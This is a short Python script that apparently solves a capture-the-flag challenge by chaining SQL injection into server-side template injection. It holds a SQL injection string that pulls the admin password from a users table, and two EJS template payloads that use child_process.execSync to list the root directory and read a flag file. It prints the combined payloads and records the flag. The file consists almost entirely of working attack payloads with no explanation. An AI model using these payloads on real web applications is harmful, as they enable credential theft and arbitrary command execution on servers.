_username = "\"), json_extract(users, '$.admin.password') AS password FROM db; --"
_username_1 = "<%- global.process.mainModule.require('child_process').execSync('ls -al /') %>"
_username_2 = "<%- global.process.mainModule.require('child_process').execSync('cat /flag2-1PRmDsTXoo3uPCdq.txt') %>"

# _password = FLAG1
print(_username + _username_1)
print(_username + _username_2)

# flag = 'FLAG{ezzzzz_sqli2ssti}'
